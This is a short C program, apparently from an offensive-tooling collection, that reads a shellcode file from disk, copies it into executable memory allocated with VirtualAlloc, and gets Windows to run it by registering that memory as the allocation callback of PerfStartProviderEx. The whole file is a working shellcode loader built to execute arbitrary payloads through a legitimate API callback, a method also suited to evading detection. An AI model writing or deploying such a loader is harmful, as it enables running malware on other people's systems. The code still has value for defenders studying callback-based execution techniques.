// Wra7h/FlavorTown
// Written/Compiled: Visual Studio 2022
// Usage: this.exe <shellcode file>
#pragma comment(lib, "Advapi32.lib")

#include <stdio.h>
#include <windows.h>
#include <perflib.h>

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize);

INT wmain(INT argc, WCHAR* argv[])
{
	BOOL Ret = FALSE;
	DWORD SCLen = 0;
	PCHAR Shellcode = NULL;

	HANDLE hProvider = NULL;

	if (argc != 2)
	{
		printf("Usage: PerfStartProviderEx.exe C:\\Path\\To\\Shellcode.bin");
		goto CLEANUP;
	}

	Ret = ReadContents(argv[1], &Shellcode, &SCLen);
	if (!Ret)
		goto CLEANUP;

	PVOID hAlloc = VirtualAlloc(NULL, SCLen,
		MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	memcpy(hAlloc, Shellcode, SCLen);

	static const GUID ProviderGuid =
	{ 0x00000000, 0x0000, 0x0000, { 0x00, 0x0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 } };

	PERF_PROVIDER_CONTEXT sPPC = { 0 };
	sPPC.MemAllocRoutine = (PERF_MEM_ALLOC)hAlloc;
	sPPC.ContextSize = sizeof(PERF_PROVIDER_CONTEXT);

	PerfStartProviderEx(&ProviderGuid, &sPPC, &hProvider);

CLEANUP:
	if (Shellcode)
		free(Shellcode);

	if (hProvider)
		PerfStopProvider(hProvider);

	return 0;
}

BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize)
{
	FILE* f = NULL;
	_wfopen_s(&f, Filepath, L"rb");
	if (f)
	{
		fseek(f, 0, SEEK_END);
		*BufferSize = ftell(f);
		fseek(f, 0, SEEK_SET);
		*Buffer = malloc(*BufferSize);
		fread(*Buffer, *BufferSize, 1, f);
		fclose(f);
	}

	return (*BufferSize != 0) ? TRUE : FALSE;
}
